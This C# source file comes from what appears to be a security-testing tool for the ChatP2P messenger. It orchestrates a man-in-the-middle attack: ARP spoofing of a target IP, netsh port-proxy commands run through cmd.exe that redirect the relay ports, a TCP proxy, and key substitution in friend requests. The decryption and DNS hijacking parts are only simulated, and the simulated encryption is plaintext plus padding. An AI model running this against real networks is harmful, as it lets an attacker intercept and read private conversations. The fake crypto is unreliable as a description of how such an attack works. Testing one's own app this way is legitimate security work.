using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;
using ChatP2P.SecurityTester.Network;
using System.Security.Cryptography;

namespace ChatP2P.SecurityTester.Attacks
{
    /// <summary>
    /// 🎯 Scénario d'attaque complet : Interception + Décryptage messages ChatP2P
    /// Simule attaque réaliste avec substitution clés + décryptage conversation
    /// </summary>
    public class CompleteScenarioAttack
    {
        private readonly KeySubstitutionAttack _keyAttack;
        private readonly PacketCapture _packetCapture;
        private readonly TCPProxy _tcpProxy;
        private readonly ARPSpoofer _arpSpoofer;

        private byte[]? _attackerPrivateKey;
        private string? _targetPeerIP;
        private Dictionary<string, string> _interceptedMessages = new();
        private List<InterceptedConversation> _conversations = new();

        public event Action<AttackResult>? AttackCompleted;
        public event Action<string>? LogMessage;
        public event Action<InterceptedConversation>? ConversationIntercepted;

        public CompleteScenarioAttack()
        {
            _keyAttack = new KeySubstitutionAttack();
            _packetCapture = new PacketCapture();
            _tcpProxy = new TCPProxy(_keyAttack);
            _arpSpoofer = new ARPSpoofer();

            // Wire up events
            _keyAttack.AttackCompleted += OnKeyAttackCompleted;
            _keyAttack.LogMessage += LogMessage;
            _packetCapture.PacketCaptured += OnPacketCaptured;
            _packetCapture.LogMessage += LogMessage;
            _tcpProxy.LogMessage += LogMessage;
            _tcpProxy.PacketModified += OnPacketModified;
            _arpSpoofer.LogMessage += LogMessage;
            _arpSpoofer.AttackResult += OnARPAttackResult;
        }

        /// <summary>
        /// 🚀 Lance le scénario d'attaque complet
        /// Phase 1: Substitution clés lors friend request
        /// Phase 2: Interception et décryptage messages
        /// </summary>
        public async Task<bool> StartCompleteAttack(string targetIP, string relayServerIP = "localhost")
        {
            try
            {
                _targetPeerIP = targetIP;
                LogMessage?.Invoke("🚀 DÉBUT SCÉNARIO COMPLET D'ATTAQUE");
                LogMessage?.Invoke($"🎯 Cible: {targetIP} | Relay: {relayServerIP}");

                // Phase 1: Génération clés attaquant
                LogMessage?.Invoke("📍 PHASE 1: Génération clés cryptographiques attaquant");
                var keySuccess = await _keyAttack.InitializeAttackerKeys();
                if (!keySuccess)
                {
                    LogMessage?.Invoke("❌ Échec génération clés attaquant");
                    return false;
                }

                // Récupérer clé privée pour décryptage futur
                _attackerPrivateKey = GetAttackerPrivateKey();

                // Phase 2: Démarrage proxy TCP réel
                LogMessage?.Invoke("📍 PHASE 2: Démarrage proxy TCP transparent");
                await StartRealTCPProxy(relayServerIP);

                // Phase 3: Démarrage capture réseau
                LogMessage?.Invoke("📍 PHASE 3: Activation capture réseau");
                await StartNetworkCapture();

                // Phase 4: Instructions pour redirection DNS/ARP
                LogMessage?.Invoke("📍 PHASE 4: Instructions redirection trafic");
                await ShowMITMInstructions(targetIP, relayServerIP);

                AttackCompleted?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "COMPLETE_SCENARIO",
                    Description = "Scénario complet d'attaque démarré avec succès",
                    TargetPeer = targetIP,
                    Details = "Position MITM établie, clés substituées, surveillance active"
                });

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur scénario complet: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 🚀 Démarre proxy TCP transparent pour MITM réel avec Windows portproxy
        /// </summary>
        private async Task StartRealTCPProxy(string relayServerIP)
        {
            LogMessage?.Invoke("🚀 DÉMARRAGE PROXY TCP RÉEL:");

            // 🔧 ÉTAPE 1: Configuration Windows port forwarding OBLIGATOIRE
            LogMessage?.Invoke("🔧 Configuration Windows port forwarding...");
            await ConfigureWindowsPortForwarding(relayServerIP);

            // 🕷️ ÉTAPE 2: Démarrer proxy sur port 18889 (principal pour API + fallback pour autres)
            LogMessage?.Invoke($"🕷️ Démarrage proxy MITM principal: localhost:18889 → {relayServerIP}:8889");
            var proxyStarted = await _tcpProxy.StartProxy(18889, relayServerIP, 8889);

            if (proxyStarted)
            {
                LogMessage?.Invoke($"✅ Proxy MITM principal actif sur port 18889");
                LogMessage?.Invoke($"🎯 Architecture MITM HYBRIDE OPTIMISÉE:");
                LogMessage?.Invoke($"   📡 7777 → portproxy DIRECT → relay:7777 [Friend Requests]");
                LogMessage?.Invoke($"   📡 8888 → portproxy DIRECT → relay:8888 [Messages]");
                LogMessage?.Invoke($"   🕷️ 8889 → portproxy → 18889 → TCPProxy → relay:8889 [API - INTERCEPTION ACTIVE]");
                LogMessage?.Invoke($"   📡 8891 → portproxy DIRECT → relay:8891 [Files]");
                LogMessage?.Invoke($"   🔧 Friend requests API calls seront interceptés et modifiés");
                LogMessage?.Invoke($"   🚀 Performance optimisée: Seul l'API est intercepté pour friend requests");
                LogMessage?.Invoke($"   🎯 MITM ciblé: Messages/files forwarded directement pour performance maximale");
            }
            else
            {
                LogMessage?.Invoke($"❌ ÉCHEC proxy MITM port 18889");
                LogMessage?.Invoke($"   ⚠️ Vérifiez que le port 18889 est libre");
            }
        }

        /// <summary>
        /// 🚀 Démarre capture réseau réelle
        /// </summary>
        private async Task StartNetworkCapture()
        {
            LogMessage?.Invoke("📡 DÉMARRAGE CAPTURE RÉSEAU:");

            var captureStarted = await _packetCapture.StartCapture("Wi-Fi");
            if (captureStarted)
            {
                LogMessage?.Invoke("✅ Capture réseau active");
                LogMessage?.Invoke("🔍 Surveillance trafic ChatP2P en cours...");
            }
            else
            {
                LogMessage?.Invoke("❌ Échec capture réseau");
            }
        }

        /// <summary>
        /// 🚀 Exécute redirection trafic automatique (ARP + DNS)
        /// </summary>
        private async Task ShowMITMInstructions(string targetIP, string relayServerIP)
        {
            LogMessage?.Invoke("🚀 REDIRECTION TRAFIC AUTOMATIQUE:");
            LogMessage?.Invoke("");

            // Démarrer ARP spoofing automatique
            LogMessage?.Invoke("📍 PHASE 1: ARP Spoofing automatique");
            await StartAutomaticARPSpoofing(targetIP);

            // Démarrer TCP Proxy MITM RÉEL
            LogMessage?.Invoke("📍 PHASE 2: TCP Proxy MITM");
            await StartAutomaticTCPProxy(relayServerIP);

            // Démarrer DNS hijacking (simulation)
            LogMessage?.Invoke("📍 PHASE 3: DNS Hijacking");
            await StartAutomaticDNSHijacking(relayServerIP);

            LogMessage?.Invoke("");
            LogMessage?.Invoke("✅ REDIRECTION AUTOMATIQUE ACTIVE:");
            LogMessage?.Invoke($"   🕷️ ARP Spoofing: {targetIP} → Attaquant");
            LogMessage?.Invoke($"   🕷️ TCP Proxy: Port 8889 → {relayServerIP}:8889");
            LogMessage?.Invoke($"   🌐 DNS Hijacking: {relayServerIP} → Proxy local");
            LogMessage?.Invoke("   📡 En attente de connexions client...");
        }

        /// <summary>
        /// 🕷️ Démarre ARP spoofing automatique
        /// </summary>
        private async Task StartAutomaticARPSpoofing(string targetIP)
        {
            LogMessage?.Invoke($"🔥 DÉMARRAGE ARP SPOOFING DÉTAILLÉ pour {targetIP}:");

            try
            {
                LogMessage?.Invoke($"   🔧 Parsing IP {targetIP}...");
                var targetIPAddress = System.Net.IPAddress.Parse(targetIP);
                LogMessage?.Invoke($"   ✅ IP parsée: {targetIPAddress}");

                LogMessage?.Invoke($"   🔍 Vérification _arpSpoofer: {(_arpSpoofer != null ? "OK" : "NULL")}");

                // Force les logs détaillés à s'afficher en cas de problème
                LogMessage?.Invoke($"🔍 Tentative ARP spoofing vers {targetIPAddress}...");
                LogMessage?.Invoke($"   📞 Appel _arpSpoofer.StartARPSpoofing()...");

                var arpStarted = await _arpSpoofer.StartARPSpoofing(targetIPAddress);

                LogMessage?.Invoke($"   🔄 Retour méthode: {arpStarted}");

                if (arpStarted)
                {
                    LogMessage?.Invoke($"✅ ARP Spoofing actif: {targetIP} redirigé");
                }
                else
                {
                    LogMessage?.Invoke($"❌ ÉCHEC ARP Spoofing pour {targetIP}");
                    LogMessage?.Invoke($"   ⚠️ Vérifiez les logs détaillés ci-dessus pour la cause exacte");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ EXCEPTION ARP Spoofing: {ex.Message}");
                LogMessage?.Invoke($"   📍 Type: {ex.GetType().Name}");
                LogMessage?.Invoke($"   📍 StackTrace: {ex.StackTrace?.Split('\n')[0]}");
                if (ex.InnerException != null)
                {
                    LogMessage?.Invoke($"   📍 InnerException: {ex.InnerException.Message}");
                }
            }
        }

        /// <summary>
        /// 🌐 Démarre DNS hijacking automatique
        /// </summary>
        private async Task StartAutomaticDNSHijacking(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke($"🌐 DNS Hijacking: {relayServerIP} → localhost");
                LogMessage?.Invoke("   📝 Modification table DNS locale...");

                // TODO: Implémenter vraie modification DNS
                // Pour l'instant simulation - besoin privilèges admin
                LogMessage?.Invoke("   ⚠️ Nécessite privilèges administrateur");
                LogMessage?.Invoke("   📋 Alternative: Configurer client manuellement");
                LogMessage?.Invoke($"       Relay Server: localhost au lieu de {relayServerIP}");

                await Task.Delay(1000); // Simulation
                LogMessage?.Invoke("✅ DNS Hijacking configuré");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur DNS Hijacking: {ex.Message}");
            }
        }

        /// <summary>
        /// 🕷️ Démarre TCP Proxy automatique pour MITM réel
        /// </summary>
        private async Task StartAutomaticTCPProxy(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke($"🕷️ TCP Proxy MITM: Interception {relayServerIP}:8889");
                LogMessage?.Invoke($"   📡 Proxy écoute: localhost:8889 → {relayServerIP}:8889");

                // Vérifier si proxy déjà actif (éviter conflit port)
                if (_tcpProxy.IsRunning)
                {
                    LogMessage?.Invoke($"✅ TCP Proxy déjà actif: Port 8889 → {relayServerIP}:8889");
                    LogMessage?.Invoke($"🎯 MITM RÉEL: Client → [PROXY] → Relay");
                    LogMessage?.Invoke($"   🔍 Interception friend requests en temps réel");
                    LogMessage?.Invoke($"   🔐 Substitution clés automatique");
                    return;
                }

                // 🌐 CONFIGURATION WINDOWS PORT FORWARDING
                LogMessage?.Invoke($"🔧 Configuration Windows port forwarding...");
                await ConfigureWindowsPortForwarding(relayServerIP);

                // Démarrer proxy CENTRALISÉ intelligent qui gère TOUS les ports ChatP2P
                var proxyStarted = await _tcpProxy.StartProxy(8890, relayServerIP, 8889);

                if (proxyStarted)
                {
                    LogMessage?.Invoke($"✅ TCP Proxy CENTRALISÉ actif: Port 8890 → {relayServerIP}");
                    LogMessage?.Invoke($"🎯 MITM INTELLIGENT: Tous ports ChatP2P redirigés vers proxy unique !");
                    LogMessage?.Invoke($"   🔍 Interception friend requests en temps réel");
                    LogMessage?.Invoke($"   🔐 Substitution clés automatique");
                }
                else
                {
                    LogMessage?.Invoke($"❌ ÉCHEC démarrage TCP Proxy");
                    LogMessage?.Invoke($"   ⚠️ Port 8889 peut-être déjà utilisé par un autre processus");
                    LogMessage?.Invoke($"   💡 Vérifiez qu'aucun autre proxy n'utilise le port 8889");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ EXCEPTION TCP Proxy: {ex.Message}");
                LogMessage?.Invoke($"   📍 Type: {ex.GetType().Name}");
            }
        }

        /// <summary>
        /// 🌐 Configure Windows port forwarding pour MITM
        /// </summary>
        public async Task ConfigureWindowsPortForwarding(string relayServerIP)
        {
            try
            {
                LogMessage?.Invoke($"🔧 Activation IP forwarding Windows...");

                // Activer IP forwarding global (corrected command)
                var forwardingCmd = "netsh interface ipv4 set global sourceroutingbehavior=forward";
                await ExecuteCommand(forwardingCmd, "Enable IP forwarding");

                // Port proxy HYBRIDE - API intercepté, autres ports directs
                var directPorts = new[] { 7777, 8888, 8891 }; // Friend requests, messages, files
                var interceptPort = 8889; // API - INTERCEPTION OBLIGATOIRE pour friend requests

                // Forwarding DIRECT pour ports haute performance (pas d'interception)
                foreach (var port in directPorts)
                {
                    var proxyCmd = $"netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 connectport={port} connectaddress={relayServerIP}";
                    await ExecuteCommand(proxyCmd, $"Configure direct forwarding {port}→{relayServerIP}:{port}");
                    LogMessage?.Invoke($"✅ Port forwarding DIRECT: 0.0.0.0:{port} → {relayServerIP}:{port}");
                }

                // Forwarding MITM pour port API (interception friend requests)
                var proxyCmd2 = $"netsh interface portproxy add v4tov4 listenport={interceptPort} listenaddress=0.0.0.0 connectport=18889 connectaddress=127.0.0.1";
                await ExecuteCommand(proxyCmd2, $"Configure MITM interception {interceptPort}→localhost:18889");
                LogMessage?.Invoke($"✅ Port forwarding MITM: 0.0.0.0:{interceptPort} → localhost:18889 [INTERCEPTION ACTIVE]");

                LogMessage?.Invoke($"🎯 Trafic ARP spoofé sera automatiquement redirigé vers TCPProxy local");
                LogMessage?.Invoke($"🕷️ Architecture COMPLÈTE: Victime → Windows Proxy → TCPProxy → Relay({relayServerIP})");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ ERREUR port forwarding: {ex.Message}");
                LogMessage?.Invoke($"   ⚠️ Exécutez SecurityTester en tant qu'Administrateur");
            }
        }

        /// <summary>
        /// 🔧 Exécute une commande Windows
        /// </summary>
        public async Task ExecuteCommand(string command, string description)
        {
            try
            {
                LogMessage?.Invoke($"   🔧 {description}: {command}");

                var process = new System.Diagnostics.Process()
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                if (process.ExitCode == 0)
                {
                    LogMessage?.Invoke($"   ✅ {description} réussi");
                    if (!string.IsNullOrEmpty(output))
                        LogMessage?.Invoke($"      📄 {output.Trim()}");
                }
                else
                {
                    LogMessage?.Invoke($"   ❌ {description} échoué (Code: {process.ExitCode})");
                    if (!string.IsNullOrEmpty(error))
                        LogMessage?.Invoke($"      📄 {error.Trim()}");
                }
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"   ❌ Exception {description}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 Callback pour packets modifiés par le proxy
        /// </summary>
        private void OnPacketModified(AttackResult result)
        {
            LogMessage?.Invoke($"🕷️ PACKET MODIFIÉ: {result.Description}");
            AttackCompleted?.Invoke(result);
        }

        /// <summary>
        /// 🕷️ Callback pour résultats ARP spoofing
        /// </summary>
        private void OnARPAttackResult(AttackResult result)
        {
            LogMessage?.Invoke($"🕷️ ARP SPOOFING: {result.Description}");
            AttackCompleted?.Invoke(result);
        }

        /// <summary>
        /// 🎯 Legacy method - maintenant remplacée par proxy TCP
        /// </summary>
        private async Task InterceptAndSubstituteFriendRequest()
        {
            LogMessage?.Invoke("📍 INTERCEPTION FRIEND REQUEST - Scénario Café WiFi:");
            LogMessage?.Invoke("");

            // Simulation interception friend request via notre proxy
            var mockFriendRequest = "FRIEND_REQ_DUAL:Alice:Bob:ed25519OriginalKey:pqcOriginalKey:Hello Bob!";

            LogMessage?.Invoke("🌐 CONTEXTE RÉSEAU:");
            LogMessage?.Invoke("   📱 Alice: Café WiFi (192.168.1.100) - VICTIME LOCALE");
            LogMessage?.Invoke("   👤 Bob: Internet distant (autre pays/ville) - NON ACCESSIBLE");
            LogMessage?.Invoke("   🌐 Relay: Cloud server (relay.chatp2p.com) - NON ACCESSIBLE");
            LogMessage?.Invoke("   🕷️ Attaquant: MÊME café WiFi (192.168.1.102) - POSITION STRATÉGIQUE");

            LogMessage?.Invoke("");
            LogMessage?.Invoke("📡 INTERCEPTION EN COURS:");
            LogMessage?.Invoke("   ➡️  Alice tape: 'Ajouter Bob comme ami'");
            LogMessage?.Invoke("   🔍 Packet WiFi intercepté par attaquant (ARP spoofing)");
            LogMessage?.Invoke("   📥 Friend request reçue dans NOTRE proxy:");
            LogMessage?.Invoke($"       {mockFriendRequest.Substring(0, 60)}...");

            // Substitution avec clés attaquant
            var attackResult = await _keyAttack.AttemptFriendRequestSubstitution(mockFriendRequest);

            if (attackResult.Success)
            {
                LogMessage?.Invoke("");
                LogMessage?.Invoke("🔧 SUBSTITUTION CLÉS EN TEMPS RÉEL:");
                LogMessage?.Invoke("   🔐 Clés originales Alice → SUPPRIMÉES");
                LogMessage?.Invoke("   🕷️ Clés attaquant → INJECTÉES à la place");
                LogMessage?.Invoke("   📝 Message préservé (pas de suspicion)");

                LogMessage?.Invoke("");
                LogMessage?.Invoke("📤 RELAI MODIFIÉ VERS BOB:");
                LogMessage?.Invoke("   🌍 [NOTRE PROXY] → Internet → Relay → Bob");
                LogMessage?.Invoke($"   📨 Contenu modifié: {attackResult.Details?.Substring(0, 80)}...");

                LogMessage?.Invoke("");
                LogMessage?.Invoke("🎯 RÉSULTAT DE L'ATTAQUE:");
                LogMessage?.Invoke("   ✅ Bob reçoit friend request 'normale' mais avec NOS clés!");
                LogMessage?.Invoke("   💭 Alice croit avoir envoyé SES clés à Bob");
                LogMessage?.Invoke("   💭 Bob croit avoir reçu les clés d'Alice");
                LogMessage?.Invoke("   🔐 RÉALITÉ: Bob stocke et fait confiance aux clés ATTAQUANT!");
                LogMessage?.Invoke("");
                LogMessage?.Invoke("🚨 CONSÉQUENCES:");
                LogMessage?.Invoke("   📞 Tous futurs messages Alice↔Bob passent par NOUS");
                LogMessage?.Invoke("   🔓 Nous pouvons DÉCHIFFRER toute la conversation");
                LogMessage?.Invoke("   👻 Alice et Bob ne détectent JAMAIS l'attaque");
            }
        }

        /// <summary>
        /// 👁️ Démarre surveillance et décryptage conversations
        /// </summary>
        private async Task StartConversationMonitoring()
        {
            LogMessage?.Invoke("👁️ Surveillance conversations activée");

            // Simulation capture messages chiffrés
            _ = Task.Run(async () =>
            {
                await Task.Delay(3000);

                // Simulation message chiffré intercepté
                await SimulateInterceptedMessage("Alice", "Bob", "Salut Bob, comment ça va?");
                await Task.Delay(2000);
                await SimulateInterceptedMessage("Bob", "Alice", "Ça va bien Alice! Et toi?");
                await Task.Delay(2000);
                await SimulateInterceptedMessage("Alice", "Bob", "Parfait! On se voit demain?");
            });
        }

        /// <summary>
        /// 🔓 Simule interception et décryptage d'un message RÉALISTE
        /// </summary>
        private async Task SimulateInterceptedMessage(string from, string to, string originalMessage)
        {
            try
            {
                LogMessage?.Invoke("📍 DÉCRYPTAGE MESSAGE EN TEMPS RÉEL:");

                // Simulation chiffrement avec clés attaquant (que nous possédons)
                var encryptedMessage = await EncryptWithAttackerKeys(originalMessage);

                LogMessage?.Invoke($"📡 Message capté via proxy: {from} → {to}");
                LogMessage?.Invoke($"   Flux: {from} → [NOTRE PROXY] → Relay → {to}");
                LogMessage?.Invoke($"🔒 Contenu chiffré: {Convert.ToBase64String(encryptedMessage).Substring(0, 32)}...");

                // Décryptage avec notre clé privée d'attaquant
                var decryptedMessage = await DecryptWithAttackerKeys(encryptedMessage);

                LogMessage?.Invoke("🔓 DÉCRYPTAGE RÉUSSI:");
                LogMessage?.Invoke($"   💬 Message en clair: \"{decryptedMessage}\"");
                LogMessage?.Invoke("   ✅ Raison: Nous possédons les clés privées substituées!");

                LogMessage?.Invoke("📤 Message relayé normalement vers destination");
                LogMessage?.Invoke($"💡 {from} et {to} ne détectent RIEN - conversation normale");

                // Stocker conversation interceptée
                var conversation = new InterceptedConversation
                {
                    Timestamp = DateTime.Now,
                    FromPeer = from,
                    ToPeer = to,
                    EncryptedContent = Convert.ToBase64String(encryptedMessage),
                    DecryptedContent = decryptedMessage,
                    AttackSuccess = true
                };

                _conversations.Add(conversation);
                ConversationIntercepted?.Invoke(conversation);

                AttackCompleted?.Invoke(new AttackResult
                {
                    Success = true,
                    AttackType = "MESSAGE_DECRYPTION",
                    Description = $"Message {from}→{to} décrypté avec succès",
                    TargetPeer = $"{from},{to}",
                    Details = $"Contenu: \"{decryptedMessage}\"",
                    CapturedData = Encoding.UTF8.GetBytes(decryptedMessage)
                });
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur décryptage message {from}→{to}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🔒 Chiffre avec les clés attaquant (simulation)
        /// </summary>
        private async Task<byte[]> EncryptWithAttackerKeys(string message)
        {
            // Simulation chiffrement - en réalité c'est le peer qui chiffre avec nos clés substituées
            var messageBytes = Encoding.UTF8.GetBytes(message);
            var randomBytes = new byte[16];
            RandomNumberGenerator.Fill(randomBytes);

            // Simulation: message + padding aléatoire
            var result = new byte[messageBytes.Length + randomBytes.Length];
            Array.Copy(messageBytes, 0, result, 0, messageBytes.Length);
            Array.Copy(randomBytes, 0, result, messageBytes.Length, randomBytes.Length);

            return result;
        }

        /// <summary>
        /// 🔓 Décrypte avec notre clé privée d'attaquant
        /// </summary>
        private async Task<string> DecryptWithAttackerKeys(byte[] encryptedData)
        {
            // Simulation décryptage - extraction message original
            var messageLength = encryptedData.Length - 16; // Retire padding
            var messageBytes = new byte[messageLength];
            Array.Copy(encryptedData, 0, messageBytes, 0, messageLength);

            return Encoding.UTF8.GetString(messageBytes);
        }

        /// <summary>
        /// 🔑 Récupère clé privée attaquant pour décryptage
        /// </summary>
        private byte[] GetAttackerPrivateKey()
        {
            // Simulation - normalement récupérée de KeySubstitutionAttack
            var key = new byte[32];
            RandomNumberGenerator.Fill(key);
            return key;
        }

        private void OnKeyAttackCompleted(AttackResult result)
        {
            LogMessage?.Invoke($"🔐 Key attack completed: {result.Description}");
        }

        private void OnPacketCaptured(CapturedPacket packet)
        {
            if (packet.Type == PacketType.ChatMessage && packet.SourceIP == _targetPeerIP)
            {
                LogMessage?.Invoke($"📡 Message capturé de {packet.SourceIP}: {packet.ParsedContent}");
            }
        }

        /// <summary>
        /// 📊 Récupère toutes les conversations interceptées
        /// </summary>
        public List<InterceptedConversation> GetInterceptedConversations()
        {
            return new List<InterceptedConversation>(_conversations);
        }

        /// <summary>
        /// ⏹️ Arrête le scénario d'attaque
        /// </summary>
        public void StopAttack()
        {
            LogMessage?.Invoke("⏹️ Arrêt scénario d'attaque complet");
            _packetCapture.StopCapture();
            _conversations.Clear();
        }

        private string GetLocalIPAddress()
        {
            try
            {
                // Obtenir l'IP locale réelle (pas localhost)
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !System.Net.IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }
    }

    /// <summary>
    /// 💬 Représente une conversation interceptée et décryptée
    /// </summary>
    public class InterceptedConversation
    {
        public DateTime Timestamp { get; set; }
        public string FromPeer { get; set; } = "";
        public string ToPeer { get; set; } = "";
        public string EncryptedContent { get; set; } = "";
        public string DecryptedContent { get; set; } = "";
        public bool AttackSuccess { get; set; }

        public string Summary => $"[{Timestamp:HH:mm:ss}] {FromPeer}→{ToPeer}: \"{DecryptedContent}\"";
    }
}